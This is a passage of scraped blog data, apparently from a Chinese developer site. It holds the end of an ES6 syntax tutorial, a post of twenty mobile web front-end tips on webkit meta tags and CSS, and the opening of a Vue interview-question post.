&lt;/p&gt;`\n);    </code></pre><h2 data-id=\"heading-4\">5.destructuring</h2><p>解构赋值这个用得算是比较多的，简单明了，就是一个简写方式！</p><pre class=\"hljs bash\"><code>//es5\nvar name=<span class=\"hljs-string\">'守候'</span>\nvar sex=<span class=\"hljs-string\">'男'</span>\nvar info= {name:name, sex: sex}\nconsole.log(info)  //Object {name: <span class=\"hljs-string\">\"守候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>}\n\n//es6\n<span class=\"hljs-built_in\">let</span> name=<span class=\"hljs-string\">'守候'</span>\n<span class=\"hljs-built_in\">let</span> sex=<span class=\"hljs-string\">'男'</span>\n<span class=\"hljs-built_in\">let</span> info= {name, sex}\nconsole.log(info)  //Object {name: <span class=\"hljs-string\">\"守候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>} \n\n//es6也可以反过来 \n<span class=\"hljs-built_in\">let</span> info={name: <span class=\"hljs-string\">\"守候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>};\n<span class=\"hljs-built_in\">let</span> {name,sex}=info;\nconsole.log(name,sex)// <span class=\"hljs-string\">\"守候\"</span> <span class=\"hljs-string\">\"男\"</span>\n</code></pre><h2 data-id=\"heading-5\">6.default, rest</h2><p>default，就是函数参数的默认值，很好理解<br>比格式化处理字符串这个函数</p><pre class=\"hljs bash\"><code>//es6写法\nformatText(str, size = 3, delimiter = <span class=\"hljs-string\">','</span>) {\n    <span class=\"hljs-built_in\">let</span> regText = <span class=\"hljs-string\">'\\\\B(?=(\\\\w{'</span> + size + <span class=\"hljs-string\">'})+(?!\\\\w))'</span>;\n    <span class=\"hljs-built_in\">let</span> reg = new RegExp(regText, <span class=\"hljs-string\">'g'</span>);\n    <span class=\"hljs-built_in\">return</span> str.replace(reg, delimiter);\n}\n//es5写法\nformatText: <span class=\"hljs-keyword\">function</span> (str, size, delimiter) {\n    var _size = size || 3, _delimiter = delimiter || <span class=\"hljs-string\">','</span>;\n    var regText = <span class=\"hljs-string\">'\\\\B(?=(\\\\w{'</span> + _size + <span class=\"hljs-string\">'})+(?!\\\\w))'</span>;\n    var reg = new RegExp(regText, <span class=\"hljs-string\">'g'</span>);\n    <span class=\"hljs-built_in\">return</span> str.replace(reg, _delimiter);\n}</code></pre><p>rest这个我不知道怎么说，看下面的实例吧</p><pre class=\"hljs bash\"><code><span class=\"hljs-keyword\">function</span> param(first,...all){\n    console.log(first)\n    console.log(all)\n    console.log(Object.prototype.toString.call(all))\n}\nanimals(<span class=\"hljs-string\">'第一个'</span>, <span class=\"hljs-string\">'第二个'</span>, <span class=\"hljs-string\">'第三个'</span>)  \n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/80751282ae0cd6ecbf05e8739b111913?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"505\" data-height=\"137\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;505&quot; height=&quot;137&quot;&gt;&lt;/svg&gt;\"></p><p>这样写，all就是一个数组，不用像<code>arguments</code>那样转成数组！</p><h2 data-id=\"heading-6\">7.export &amp; import</h2><p>这两个对应的就是对应的特性就是，模块化开发，这个可以说是最实用的一个新特性了！功能也强大，但是写起来就很简单！就几个代码！看图吧！</p><p>封装模块的时候，用export把模块暴露出去</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/e0341f8b1c6ea4ce2177f9d8bb6f147c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"354\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;354&quot;&gt;&lt;/svg&gt;\"></p><p>需要使用的时候，用import引进行来，完事</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/26e24756e71443b77fa871cbf9df14df?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"456\" data-height=\"31\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;456&quot; height=&quot;31&quot;&gt;&lt;/svg&gt;\"></p><p>顺便提一下，另一个按需引入的方法</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/82d513af17a06b74aa4901a555b987c9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"786\" data-height=\"331\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;786&quot; height=&quot;331&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/f421836fce6f088216466ead3f3e46d9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"373\" data-height=\"65\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;373&quot; height=&quot;65&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-7\">8.API推荐</h2><h3 data-id=\"heading-8\">8-1.字符串</h3><h4 data-id=\"heading-9\">repeat</h4><p>repeat方法返回一个新字符串，表示将原字符串重复n次。</p><pre class=\"hljs bash\"><code><span class=\"hljs-string\">'守候'</span>.repeat(3)\n//<span class=\"hljs-string\">\"守候守候守候\"</span></code></pre><h4 data-id=\"heading-10\">includes &amp; startsWith &amp; endsWith</h4><p><code>includes</code>：是否找到了参数字符串,返回布尔值。<br><code>startsWith</code>：参数字符串是否在原字符串的头部,返回布尔值。<br><code>endsWith</code>：参数字符串是否在原字符串的尾部,返回布尔值。</p><p>三个方法都接受两个参数，第一个参数是参数字符串，第二个是开始检索的位置</p><pre class=\"hljs bash\"><code>var str=<span class=\"hljs-string\">'我就是守候'</span>\nstr.startsWith(<span class=\"hljs-string\">'我就是'</span>)//<span class=\"hljs-literal\">true</span>\nstr.startsWith(<span class=\"hljs-string\">'我'</span>)//<span class=\"hljs-literal\">true</span>\nstr.startsWith(<span class=\"hljs-string\">'我'</span>,2)//<span class=\"hljs-literal\">false</span>\nstr.startsWith(<span class=\"hljs-string\">'守候'</span>)//<span class=\"hljs-literal\">false</span>\nstr.endsWith(<span class=\"hljs-string\">'守候'</span>)//<span class=\"hljs-literal\">true</span>\nstr.includes(<span class=\"hljs-string\">'守候'</span>)//<span class=\"hljs-literal\">true</span>\nstr.includes(<span class=\"hljs-string\">'我'</span>,3)//<span class=\"hljs-literal\">false</span>\n</code></pre><h4 data-id=\"heading-11\">padStart &amp; padEnd</h4><p><code>padStart</code>:如果字符串不够指定长度，在头部补全指定字符<br><code>padEnd</code>：如果字符串不够指定长度，在尾部补全指定字符</p><p>两个方法都接收两个参数，第一个是指定字符串的最小长度，第二个用来补全的字符串。如果指定字符串的长度，等于或大于指定的最小长度（第一个参数）。就直接返回原字符串，如果忽略第二个参数，就使用空格补全原字符串！</p><pre class=\"hljs bash\"><code>var str=<span class=\"hljs-string\">'守候'</span>\nstr.padEnd(10,<span class=\"hljs-string\">'123'</span>)//<span class=\"hljs-string\">\"守候12312312\"</span>\nstr.padStart(10,<span class=\"hljs-string\">'123'</span>)//<span class=\"hljs-string\">\"12312312守候\"</span>\nstr.padEnd(10)//<span class=\"hljs-string\">\"守候        \"</span>\nstr.padStart(10)//<span class=\"hljs-string\">\"        守候\"</span>\nstr.padStart(1)//<span class=\"hljs-string\">\"守候\"</span>\nstr.padEnd(1)//<span class=\"hljs-string\">\"守候\"</span></code></pre><h3 data-id=\"heading-12\">8-2.数值</h3><h4 data-id=\"heading-13\">isNaN</h4><p>检查一个值是否为NaN</p><pre class=\"hljs bash\"><code>Number.isNaN(NaN)//<span class=\"hljs-literal\">true</span>\nNumber.isNaN(15)//<span class=\"hljs-literal\">false</span></code></pre><h4 data-id=\"heading-14\">isInteger</h4><p>判断一个值是否为整数,需要注意的是，比如1和1.0都是整数。</p><pre class=\"hljs bash\"><code>Number.isInteger(1)//<span class=\"hljs-literal\">true</span>\nNumber.isInteger(1.0)//<span class=\"hljs-literal\">true</span>\nNumber.isInteger(1.1)//<span class=\"hljs-literal\">false</span>\n</code></pre><h4 data-id=\"heading-15\">sign</h4><p>判断一个数到底是正数、负数、还是零</p><pre class=\"hljs bash\"><code>Math.sign(-10)// -1\nMath.sign(10)// +1\nMath.sign(0)// +0\nMath.sign(-0)// -0\nMath.sign(NaN)// NaN\nMath.sign(<span class=\"hljs-string\">'10'</span>)// +1\nMath.sign(<span class=\"hljs-string\">'守候'</span>)// NaN\nMath.sign(<span class=\"hljs-string\">''</span>)// 0\nMath.sign(<span class=\"hljs-literal\">true</span>)// +1\nMath.sign(<span class=\"hljs-literal\">false</span>)// 0\nMath.sign(null)// 0\n</code></pre><h4 data-id=\"heading-16\">trunc</h4><p>去除一个数的小数部分，返回整数部分</p><pre class=\"hljs bash\"><code>Math.trunc(1.1)//1\nMath.trunc(-1.1)//-1\nMath.trunc(-0.1)//-0\nMath.trunc(<span class=\"hljs-string\">'123.456'</span>)//123\nMath.trunc(<span class=\"hljs-string\">'守候'</span>)//NaN\n</code></pre><h3 data-id=\"heading-17\">8-3.对象</h3><h4 data-id=\"heading-18\">assign</h4><p>用于对象的合并，复制到目标对象。</p><pre class=\"hljs bash\"><code>var _name={name:<span class=\"hljs-string\">'守候'</span>},sex={sex:<span class=\"hljs-string\">'男'</span>},city={<span class=\"hljs-string\">'city'</span>:<span class=\"hljs-string\">'广州'</span>}\nObject.assign(_name,sex,city)//{name: <span class=\"hljs-string\">\"守候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>, city: <span class=\"hljs-string\">\"广州\"</span>}\n\nvar info1={name:<span class=\"hljs-string\">'守'</span>,sex:<span class=\"hljs-string\">'男'</span>},info2={name:<span class=\"hljs-string\">'候'</span>,city:<span class=\"hljs-string\">'广州'</span>}\nObject.assign(info1,info2)//{name: <span class=\"hljs-string\">\"候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>, city: <span class=\"hljs-string\">\"广州\"</span>}</code></pre><p>克隆原来这样对象，这样克隆对象，修改了info1或者info3，不会影响info3或者info1，但是Object.assign并不是深拷贝。详细的可以参考我之前的文章--<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000011031658%23articleHeader2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">对象深浅拷贝</a></p><pre class=\"hljs bash\"><code>var info1={name:<span class=\"hljs-string\">'守'</span>,sex:<span class=\"hljs-string\">'男'</span>}\nvar info3=Object.assign(info1,{})//{name:<span class=\"hljs-string\">'守'</span>,sex:<span class=\"hljs-string\">'男'</span>}</code></pre><h4 data-id=\"heading-19\">keys</h4><p>根据对象自身可遍历的键名进行遍历，返回一个数组</p><pre class=\"hljs bash\"><code>var info={name: <span class=\"hljs-string\">\"守候\"</span>, sex: <span class=\"hljs-string\">\"男\"</span>, city: <span class=\"hljs-string\">\"广州\"</span>}\nObject.keys(info)//[<span class=\"hljs-string\">\"name\"</span>, <span class=\"hljs-string\">\"sex\"</span>, <span class=\"hljs-string\">\"city\"</span>]\n</code></pre><h4 data-id=\"heading-20\">values</h4><p>根据对象自身可遍历的键值进行遍历，返回一个数组</p><pre class=\"hljs bash\"><code>Object.values(info)//[<span class=\"hljs-string\">\"守候\"</span>, <span class=\"hljs-string\">\"男\"</span>, <span class=\"hljs-string\">\"广州\"</span>]\n</code></pre><h4 data-id=\"heading-21\">entries</h4><p>根据对象自身可遍历的键值对进行遍历，返回一个数组</p><pre class=\"hljs bash\"><code>Object.entries(info)//[[<span class=\"hljs-string\">\"name\"</span>, <span class=\"hljs-string\">\"守候\"</span>],[<span class=\"hljs-string\">\"sex\"</span>, <span class=\"hljs-string\">\"男\"</span>],[<span class=\"hljs-string\">\"city\"</span>, <span class=\"hljs-string\">\"广州\"</span>]]\n</code></pre><h3 data-id=\"heading-22\">8-4.数组</h3><h4 data-id=\"heading-23\">from</h4><p><code>from</code>用于将两类对象转为真正的数组：类似数组的对象和可遍历的对象</p><pre class=\"hljs bash\"><code>Array.from(<span class=\"hljs-string\">'守候'</span>)//[<span class=\"hljs-string\">\"守\"</span>, <span class=\"hljs-string\">\"候\"</span>]\n//常见的使用方式还有-将Dom集合和arguments转成真正的数组\n<span class=\"hljs-built_in\">let</span> oLi = document.querySelectorAll(<span class=\"hljs-string\">'li'</span>);\nArray.from(oLi ).forEach(<span class=\"hljs-keyword\">function</span> (item) {\n  console.log(item);\n});\n\n// arguments对象\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">fn</span></span>() {\n  <span class=\"hljs-built_in\">let</span> args = Array.from(arguments);\n}\n//顺便说下Set\n<span class=\"hljs-built_in\">let</span> newSet = new Set([<span class=\"hljs-string\">'a'</span>, <span class=\"hljs-string\">'b'</span>,<span class=\"hljs-string\">'a'</span>,<span class=\"hljs-string\">'c'</span>])\nArray.from(newSet) // [<span class=\"hljs-string\">'a'</span>, <span class=\"hljs-string\">'b'</span>,<span class=\"hljs-string\">'c'</span>] \n//ES6 新增的数据结构--Set。它类似于数组，但是成员的值都是唯一的，不重复的。\n//相信大家很容易想到怎么用了，比如数组去重，用Set实现就简单多了。   \nremoveRepeatArray(arr) {\n    //<span class=\"hljs-built_in\">return</span> [Array.from(arr)]\n    <span class=\"hljs-built_in\">return</span> [...new Set(arr)]\n}</code></pre><h4 data-id=\"heading-24\">find</h4><p><code>find</code>方法，用于找出第一个符合条件的数组成员。如果没找到符合条件的成员就返回<code>underfind</code></p><pre class=\"hljs bash\"><code>//第一个大于2的成员\n[1, 2, 3, 4].find((n) =&gt; n &gt; 2)//3</code></pre><h4 data-id=\"heading-25\">findIndex</h4><p><code>findIndex</code>方法，用于找出第一个符合条件的数组成员的索引。</p><pre class=\"hljs bash\"><code>//第一个大于2的成员的索引\n[1, 2, 3, 4].findIndex((n) =&gt; n &gt; 2)//2</code></pre><h4 data-id=\"heading-26\">includes</h4><p><code>includes</code>方法，用于某个数组是否包含给定的值，返回一个布尔值。如果没找到符合条件的成员就返回<code>underfind</code></p><pre class=\"hljs bash\"><code>[1, 2, 3].includes(2)//<span class=\"hljs-literal\">true</span>\n[1, 2, 3].includes(5)//<span class=\"hljs-literal\">false</span>\n[1, 2, NaN].includes(NaN)//<span class=\"hljs-literal\">true</span></code></pre><h2 data-id=\"heading-27\">9.小结</h2><p>好了，关于es6的常用语法和比es5优越的方面区别，就说到这里了，这些是我在平常开发用的比较多。如果想详细学习es6，移步到阮一峰的-<a href=\"https://link.juejin.im?target=http%3A%2F%2Fes6.ruanyifeng.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ECMAScript 6 入门</a>。这些语法相信在开发了已经占了很大的一个比重了！当然如果大家还有什么好的语法，API推荐，或者觉得我哪里写错了，写得不好，欢迎给出宝贵的意见，指点下迷津。也期待大家相互学习，一起进步！</p><p><br></p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div>"},null,null,{"title":"手机/移动前端开发需要注意的20个要点","avatar":"https://user-gold-cdn.xitu.io/2017/9/25/c459d2f78a2eaff68beb8ed865c7a615?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"xuhaoxin123","create_time":"2017 年 11 月 10 日","tags":["iOS","Android","Webkit","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>定心丸：移动前端开发正逐渐步入前端技术的主流，事实上跟在一般的pc上，并不需要你掌握额外的技术，然而你在pc web上那一套在多数情况下并不适用于手机web，你必须知道这其中的注意点。当然移动web给人的感觉是一个拼h5和css3的阵地，这里面有足够高大上的技术等着你去驾驭，在这方面，你可以欣喜地说：让ie见鬼去吧。</p>\n<h5 class=\"heading\" data-id=\"heading-0\">1、首先我们来看看webkit内核中的一些私有的meta标签，这些meta标签在开发webapp时起到非常重要的作用</h5><pre><code class=\"hljs bash\" lang=\"bash\">&lt;meta content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\"</span> name=<span class=\"hljs-string\">\"viewport\"</span>&gt;\n&lt;meta content=<span class=\"hljs-string\">\"yes\"</span> name=<span class=\"hljs-string\">\"apple-mobile-web-app-capable\"</span>&gt;\n&lt;meta content=<span class=\"hljs-string\">\"black\"</span> name=<span class=\"hljs-string\">\"apple-mobile-web-app-status-bar-style\"</span>&gt;\n&lt;meta content=<span class=\"hljs-string\">\"telephone=no\"</span> name=<span class=\"hljs-string\">\"format-detection\"</span>&gt;</code></pre><p>第一个meta标签表示：强制让文档的宽度与设备的宽度保持1:1，并且文档最大的宽度比例是1.0，且不允许用户点击屏幕放大浏览；</p>\n<p>第二个meta标签是iphone设备中的safari私有meta标签，它表示：允许全屏模式浏览；</p>\n<p>第三个meta标签也是iphone的私有标签，它指定的iphone中safari顶端的状态条的样式；</p>\n<p>第四个meta标签表示：告诉设备忽略将页面中的数字识别为电话号码</p>\n<h5 class=\"heading\" data-id=\"heading-1\">2、HTML5标签的使用</h5><p>在开始编写webapp时，哥建议前端工程师使用HTML5，而放弃HTML4，因为HTML5可以实现一些HTML4中无法实现的丰富的WEB应用程序的体验，可以减少开发者很多的工作量，当然了你决定使用HTML5前，一定要对此非常熟悉，要知道HTML5的新标签的作用。比如定义一块内容或文章区域可使用section标签，定义导航条或选项卡可以直接使用nav标签等等。</p>\n<h5 class=\"heading\" data-id=\"heading-2\">3、放弃CSS float属性</h5><p>在项目开发过程中可以会遇到内容排列显示的布局，假如你遇见这样的视觉稿，哥建议你放弃float，可以直接使用display:inline-block;</p>\n<h5 class=\"heading\" data-id=\"heading-3\">4、利用CSS3边框背景属性</h5><p>这个按钮有圆角效果，有内发光效果还有高光效果，这样的按钮使用CSS3写是无法写出来的，当然圆角可以使用CSS3来写，但高光和内发光却无法使用CSS3编写，</p>\n<p>这个时候你不妨使用-webkit-border-image来定义这个按钮的样式。</p>\n<p>-webkit-border-image就个很复杂的样式属性。</p>\n<h5 class=\"heading\" data-id=\"heading-4\">5、块级化a标签</h5><p>请保证将每条数据都放在一个a标签中，为何这样做？因为在触控手机上，为提升用户体验，尽可能的保证用户的可点击区域较大。</p>\n<h5 class=\"heading\" data-id=\"heading-5\">6、自适应布局模式</h5><p>在编写CSS时，我不建议前端工程师把容器（不管是外层容器还是内层）的宽度定死。为达到适配各种手持设备，我建议前端工程师使用自适应布局模式（支付宝采用了自适应布局模式），因为这样做可以让你的页面在ipad、itouch、ipod、iphone、android、web safarik、chrome都能够正常的显示，你无需再次考虑设备的分辨率。</p>\n<h5 class=\"heading\" data-id=\"heading-6\">7、学会使用webkit-box</h5><p>上一节，我们说过自适应布局模式，有些同学可能会问：如何在移动设备上做到完全自适应呢？很感谢webkit为display属性提供了一个webkit-box的值，它可以帮助前端工程师做到盒子模型灵活控制。</p>\n<h5 class=\"heading\" data-id=\"heading-7\">8、如何去除Android平台中对邮箱地址的识别</h5><p>看过iOS webapp API的同学都知道iOS提供了一个meta标签:用于禁用iOS对页面中电话号码的自动识别。在iOS中是不自动识别邮件地址的，但在Android平台，它会自动检测邮件地址，当用户touch到这个邮件地址时，Android会弹出一个框提示用户发送邮件，如果你不想Android自动识别页面中的邮件地址，你不妨加上这样一句meta标签在head中</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;meta content=<span class=\"hljs-string\">\"email=no\"</span> name=<span class=\"hljs-string\">\"format-detection\"</span> /&gt;</code></pre><h5 class=\"heading\" data-id=\"heading-8\">9、如何去除iOS和Android中的输入URL的控件条</h5><p>9、如何去除iOS和Android中的输入URL的控件条</p>\n<p>你的老板或者PD或者交互设计师可能会要求你：能否让我们的webapp更加像nativeapp，我不想让用户看见那个输入url的控件条？</p>\n<p>答案是可以做到的。我们可以利用一句简单的javascript代码来实现这个效果</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">set</span>Timeout(scrollTo,0,0,0);</code></pre><p>请注意，这句代码必须放在window.onload里才能够正常的工作，而且你的当前文档的内容高度必须是高于窗口的高度时，这句代码才能有效的执行。</p>\n<h5 class=\"heading\" data-id=\"heading-9\">10、如何禁止用户旋转设备</h5><p>我曾经也想禁止用户旋转设备，也想实现像某些客户端那样：只能在肖像模式或景观模式下才能正常运行。但现在我可以很负责任的告诉你：别想了!在移动版的webkit中做不到！</p>\n<p>至少Apple webapp API已经说到了：我们为了让用户在safari中正常的浏览网页，我们必须保证用户的设备处于任何一个方位时，safari都能够正常的显示网页内容（也就是自适应），所以我们禁止开发者阻止浏览器的orientationchange事件，看来苹果公司的出发点是正确的，苹果确实不是一般的苹果。</p>\n<p>iOS已经禁止开发者阻止orientationchange事件，那Android呢？对不起，我没有找到任何资料说Android禁止开发者阻止浏览器orientationchange事件，但是在Android平台，确实也是阻止不了的。</p>\n<h5 class=\"heading\" data-id=\"heading-10\">11、如何检测用户是通过主屏启动你的webapp</h5><p>看过Apple webapp API的同学都知道iOS为safari提供了一个将当前页面添加主屏的功能，按下iphoneipodipod touch底部工具中的小加号，或者ipad顶部左侧的小加号，就可以将当前的页面添加到设备的主屏，在设备的主屏会自动增加一个当前页面的启动图标，点击该启动图标就可以快速、便捷的启动你的webapp。从主屏启动的webapp和浏览器访问你的webapp最大的区别是它清除了浏览器上方和下方的工具条，这样你的webapp就更加像是nativeapp了，还有一个区别是window对像中的navigator子对象的一个standalone属性。iOS中浏览器直接访问站点时，navigator.standalone为false,从主屏启动webapp时，navigator.standalone为true， 我们可以通过navigator.standalone这个属性获知用户当前是否是从主屏访问我们的webapp的。<br>在Android中从来没有添加到主屏这回事！</p>\n<h5 class=\"heading\" data-id=\"heading-11\">12、如何关闭iOS中键盘自动大写</h5><p>我们知道在iOS中，当虚拟键盘弹出时，默认情况下键盘是开启首字母大写的功能的，根据某些业务场景，可能我们需要关闭这个功能，移动版本webkit为input元素提供了autocapitalize属性，通过指定autocapitalize=”off”来关闭键盘默认首字母大写。</p>\n<h5 class=\"heading\" data-id=\"heading-12\">13、iOS中如何彻底禁止用户在新窗口打开页面</h5><p>有时我们可能需要禁止用户在新窗口打开页面，我们可以使用a标签的target=”_self“来指定用户在新窗口打开，或者target属性保持空，但是你会发现iOS的用户在这个链接的上方长按3秒钟后，iOS会弹出一个列表按钮，用户通过这些按钮仍然可以在新窗口打开页面，这样的话，开发者指定的target属性就失效了，但是可以通过指定当前元素的-webkit-touch-callout样式属性为none来禁止iOS弹出这些按钮。这个技巧仅适用iOS对于Android平台则无效。</p>\n<h5 class=\"heading\" data-id=\"heading-13\">14、iOS中如何禁止用户保存图片＼复制图片</h5><p>我们在第13条技巧中提到元素的-webkit-touch-callout属性，同样为一个img标签指定-webkit-touch-callout为none也会禁止设备弹出列表按钮，这样用户就无法保存＼复制你的图片了。</p>\n<h5 class=\"heading\" data-id=\"heading-14\">15、iOS中如何禁止用户选中文字</h5><p>我们通过指定文字标签的-webkit-user-select属性为none便可以禁止iOS用户选中文字。</p>\n<h5 class=\"heading\" data-id=\"heading-15\">16、iOS中如何获取滚动条的值</h5><p>桌面浏览器中想要获取滚动条的值是通过document.scrollTop和document.scrollLeft得到的，但在iOS中你会发现这两个属性是未定义的，为什么呢？因为在iOS中没有滚动条的概念，在Android中通过这两个属性可以正常获取到滚动条的值，那么在iOS中我们该如何获取滚动条的值呢？</p>\n<p>通过window.scrollY和window.scrollX我们可以得到当前窗口的y轴和x轴滚动条的值。</p>\n<h5 class=\"heading\" data-id=\"heading-16\">17、如何解决盒子边框溢出</h5><p>当你指定了一个块级元素时，并且为其定义了边框，设置了其宽度为100％。在移动设备开发过程中我们通常会对文本框定义为宽度100％，将其定义为块级元素以实现全屏自适应的样式，但此时你会发现，该元素的边框(左右)各1个像素会溢了文档，导致出现横向滚动条，为解决这一问题，我们可以为其添加一个特殊的样式-webkit-box-sizing:border-box;用来指定该盒子的大小包括边框的宽度。</p>\n<h5 class=\"heading\" data-id=\"heading-17\">18、如何解决Android 2.0以下平台中圆角的问题</h5><p>如果大家够细心的话，在做wap站点开发时，大家应该会发现android 2.0以下的平台中问题特别的多，比如说边框圆角这个问题吧。</p>\n<p>在对一个元素定义圆角时，为完全兼容android 2.0以下的平台，我们必须要按照以下技巧来定义边框圆角：</p>\n<p>1＼-webkit这个前缀必须要加上（在iOS中，你可以不加，但android中一定要加）；</p>\n<p>2＼如果对针对边框做样式定义，比如border:1px solid #000;那么-webkit-border-radius这属性必须要出现在border属性后。</p>\n<p>3＼假如我们有这样的视觉元素，左上角和右上角是圆角时，我们必须要先定义全局的(4个角的圆角值)-webkit-border-radius:5px;然后再依次的覆盖左下角和右下角，-webkit-border-bottom-left-radius:0;-webkit-border-bottom-right-border:0;否则在android 2.0以下的平台中将全部显示直角，还有记住！-webkit这个前缀一定要加上！</p>\n<h5 class=\"heading\" data-id=\"heading-18\">19、如何解决android平台中页面无法自适应</h5><p>虽然你的html和css都是完全自适应的，但有一天如果你发现你的页面在android中显示的并不是自适应的时候，首先请你确认你的head标签中是否包含以下meta标签：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0;\"</span> /&gt;</code></pre><p>如果有的话，那请你再仔细的看清楚有没有这个属性的值width=device-width，如果没有请立即加上吧！</p>\n<h5 class=\"heading\" data-id=\"heading-19\">20、如何解决iOS 4.3版本中safari对页面中5位数字的自动识别和自动添加样式</h5><p>新的iOS系统也就是4.3版本，升级后对safari造成了一个bug：即使你添加了如下的meta标签，safari仍然会对页面中的5位连续的数字进行自动识别，并且将其重新渲染样式，也就是说你的css对该标签是无效的。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;meta name=<span class=\"hljs-string\">\"format-detection\"</span> content=<span class=\"hljs-string\">\"telphone=no\"</span> /&gt;</code></pre><p>我们可以用一个比较龌龊的办法来解决。比如说支付宝wap站点中显示金额的标签，我们都做了如下改写：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;button class=<span class=\"hljs-string\">\"t-balance\"</span>style=<span class=\"hljs-string\">\"background:none;padding:0;border:0;\"</span>&gt;95009.00&lt;/button&gt;元</code></pre></div>"},null,null,{"title":"vue面试题总汇","avatar":"https://user-gold-cdn.xitu.io/2017/9/25/c459d2f78a2eaff68beb8ed865c7a615?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"xuhaoxin123","create_time":"2017 年 11 月 06 日","tags":[],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h4 class=\"heading\" data-id=\"heading-0\">vue的底层原理?</h4><h4 class=\"heading\" data-id=\"heading-1\">vue组件之间的通信？</h4><h4 class=\"heading\" data-id=\"heading-2\">JS中判断数据类型的方法有几种?</h4><p><font color=\"blue\">最常见的判断方法：</font><font color=\"red\">typeof</font></p>\n<p><font color=\"blue\">判断已知对象类型的方法：</font> <font color=\"red\">instanceof</font></p>\n<p><font color=\"blue\">根据对象的constructor判断：</font><font color=\"red\"> constructor</font></p>\n<p><font color=\"blue\">无敌万能的方法：</font><font color=\"red\">jquery.type()</font></p>\n<h4 class=\"heading\" data-id=\"heading-3\">vue与angular的区别?</h4><p>1.vue仅仅是mvvm中的view层，只是一个如jquery般的工具库，而不是框架，而angular而是mvvm框架。<br>2.vue的双向邦定是基于ES5 中的 3.getter/setter来实现的，而angular而是由自己实现一套模版编译规则，需要进行所谓的“脏”检查，vue则不需要。因此，vue在性能上更高效，但是代价是对于ie9以下的浏览器无法支持。<br>4.vue需要提供一个el对象进行实例化，后续的所有作用范围也是在el对象之下，而angular而是整个html页面。一个页面，可以有多个vue实例，而angular好像不是这么玩的。<br>5.vue真的很容易上手，学习成本相对低，不过可以参考的资料不是很丰富，官方文档比较简单，缺少全面的使用案例。高级的用法，需要自己去研究源码，至少目前是这样。</p>\n<h4 class=\"heading\" data-id=\"heading-4\">说说你对angular脏检查理解？</h4><p>在angular中你无法判断你的数据是否做了更改，所以它设置了一些条件，当你触发这些条件之后,它就执行一个检测来遍历所有的数据，对比你更改的地方，然后执行变化。<br>这个检查很不科学。而且效率不高，有很多多余的地方，所以官方称为 脏检查。</p>\n<h4 class=\"heading\" data-id=\"heading-5\">active-class是哪个组件的属性？</h4><p>vue-router模块的router-link组件。</p>\n<h4 class=\"heading\" data-id=\"heading-6\">嵌套路由怎么定义？</h4><p>在实际项目中我们会碰到多层嵌套的组件组合而成，但是我们如何实现嵌套路由呢？因此我们需要在 VueRouter 的参数中使用 children 配置，这样就可以很好的实现路由嵌套。<br>index.html，只有一个路由出口</p>\n<pre><code class=\"hljs 